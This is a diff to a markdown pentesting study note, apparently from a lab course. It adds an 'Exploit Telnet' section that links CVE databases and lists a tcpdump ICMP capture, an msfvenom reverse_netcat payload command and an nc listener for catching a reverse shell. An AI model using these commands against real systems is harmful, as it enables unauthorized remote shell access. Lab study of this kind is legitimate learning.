@@ -28,7 +28,12 @@ Telnet is an application protocol which allows you, with the use of a telnet cli
 `telnet [ip] [port]`  
 
 ### Exploit Telnet
-
+- https://www.cvedetails.com/
+- https://cve.mitre.org/  
+However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.  
+`sudo tcpdump ip proto \\icmp -i tun0`  
+`"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`  
+`"nc -lvp [listening port]"`  
 
 ## FTP - File Transfer Protocol -
 FTP is a protocol used to allow remote transfer of files over a network.  
